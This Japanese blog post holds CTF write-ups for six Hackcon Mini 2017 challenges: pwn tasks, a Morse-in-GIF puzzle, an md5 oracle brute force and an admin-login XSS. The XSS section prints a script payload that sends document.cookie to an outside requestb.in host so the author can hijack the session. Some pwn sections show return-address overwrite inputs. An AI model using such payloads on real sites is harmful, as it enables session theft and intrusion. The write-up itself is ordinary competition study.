---
layout: post
title: Hackcon Mini の write-up
categories: [ctf]
date: 2017-02-12 05:30:00 +0900
---

チーム Harekaze で [Hackcon Mini](http://hackcon.in/) に参加しました。

最終的にチームで 585 点を獲得し、順位は 8 位 (得点 110 チーム中) でした。うち、私は 6 問を解いて 590 点を入れました。

…計算が合いませんが、これは罠として仕込まれている特定のフラグを送信すると、マイナスの得点が入ってしまうという問題があったためです。

以下、解いた問題の write-up です。

## [PWN 30] Random

乱数を当てろという問題です。最初に `srand(time(NULL))` をしており、しかもこの `time(NULL)` の値を教えてくれるので、こちらで再現した値を投げれば終わりです。

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv) {
  srand(atoi(argv[1]));
  printf("%d\n", rand());
  return 0;
}
```

```
HACKCON{n00b_scrubs_get_me_a_real_pwn!}
```

## [PWN 100] Game of Integers - Part 1

SSP がありますが、canary を書き換えずに直接リターンアドレスを書き換えられます。`run_me` に飛ばしましょう。

```
$ nc 35.154.158.26 31338
Which index do you want to overwrite?
24
Enter value to overwrite:
134513979
Lets see!
HACKCON{Exploitation_Is_All_About_Magic_Numbers}
Its impossible to run me. Is it?
```

```
HACKCON{Exploitation_Is_All_About_Magic_Numbers}
```

## [PWN 200] Game of Integers - Part 2

`run_me` は潰されてしまっているようなので、直接 `system` を呼んでしまいましょう。

```
$ nc 35.154.158.26 31337
Which index do you want to start the overwrite?
24
How many integers?
3
Enter value to overwrite:
134513664
Enter value to overwrite:
1094795585
Enter value to overwrite:
134514497
Lets see!
HACKCON{ROP_WITH_INTS}
```

```
HACKCON{ROP_WITH_INTS}
```

## [Web 50] Webdev

DevTools を開きながらページを見ると、`movie.gif` というやけに大きな gif を取りに行っているのが確認できます。

この gif はアニメーションでチカチカ点滅していますが、白が表示される間隔が少しズレているように思えます。黒を 0、白を 1 として文字列にしてみましょう。

```python
from PIL import Image
im = Image.open('movie.gif')
w, h = im.size
res = ''
try:
  while True:
    i = im.convert('RGB')
    res += '0' if i.getpixel((0, 0)) == (0, 0, 0) else '1'
    im.seek(im.tell() + 1)
except:
  print(res)
```

結果を `result.txt` として保存して、さらに次のスクリプトを実行します。

```python
s = open('result.txt').read().strip()
s = s.replace('00000', ' ')
s = s.replace('0000', '-')
s = s.replace('000', '.')
s = s.replace('1', '')
print(s)
```

```
.... . .-.. .-.. ---   ..-. .-. .. . -. -..   .... . .-.. .-.. ---   ..-. .-. .. . -. -..   - .... .- - ...   .-.. .- -- .   -- .- -.-- -... .   ..   ... .... --- ..- .-.. -..   --. .. ...- .   -.-- --- ..-   .-   -. .- -- .   -... ..- -   - .... .- - ...   .-   ... .-.. .. .--. .--. . .-. -.--   ... .-.. --- .--. .   -.-- --- ..- .-. .   --- -. .-.. -.--   .. -.   -- -.--   .... . .- -..   .-- .   .... .- ...- .   - ---   .-. . -- . -- -... . .-.   - .... .- -   .- -. -..   --- -. .   - .... .. -. --.     -... - .--   - .... .   ..-. .-.. .- --.   .. ...   .... .- -.-. -.- -.-. --- -. -- --- .-. ... . ..-. .-.. .- --.
```

モールス信号が出てきました。これをデコードするとフラグが出てきました。Web とは…。

```
`HACKCONMORSEFLAG`
```

## [Web 60] Admin Login

とりあえずデモユーザーでログイン。試しに `<s>haifuri</s>` をポストすると、エスケープされずに表示されました。XSS があるようです。

`<script>(new Image).src='http://requestb.in/xxx?'+document.cookie;</script>` をポストしてみると、サーバの IP アドレスからセッション ID 付きでアクセスが来ました。

このセッション ID をセットして更新すると、フラグが表示されました。

```
seSSi0n_h!Jack1ng_!s_@wesOmEEEEE!
```

## [Web 150] BF

問題文を確認しましょう。得られた文字列が `tyuio` のときフラグは `87c1b071153ae8fd35acfd9ab3f3f6bb` で、`juteg` のときフラグは `d6d684e70bb4c5801b012151141add87` になるようです。

[CrackStation](https://crackstation.net/) に `87c1b071153ae8fd35acfd9ab3f3f6bb` を投げるとこれは `bgcqw` の md5 ハッシュだと分かりました。これは `tyuio` をシーザー暗号で右に 8 シフトさせた文字列です。

動いているサービスを確認しましょう。任意の Brain なんとかのコードを実行できますが、返ってくる出力は md5 にかけられてしまっています。そして、欲しい文字列は入力として入ってきます。

1 バイトずつ出力させれば、あらかじめテーブルを作っておくだけで元の文字が分かります。

```python
import hashlib
import requests

t = {}
for x in range(256):
  t[hashlib.md5(bytes([x])).hexdigest()] = chr(x)

i = 1
res = ''
while True:
  r = requests.get('http://35.154.158.26:10300/{}.'.format(',' * i))
  res += t[r.content.decode('ascii')]
  print(res)
  i += 1
```

結果は `bpqaqabpmwzqoqvitntioGMAAAAABPMnTiOQaippipilpplpl` でした。これを右に 8 シフトさせて md5 にかけたものがフラグです。

```
`9418ba5c569b70839474e121a7a72d58`
```

## 感想

この CTF は競技時間が 5 時間と非常に短いものでした。問題の量と難易度はその短さに見合ったものでしたが、それでもちょっとなあという感じです。
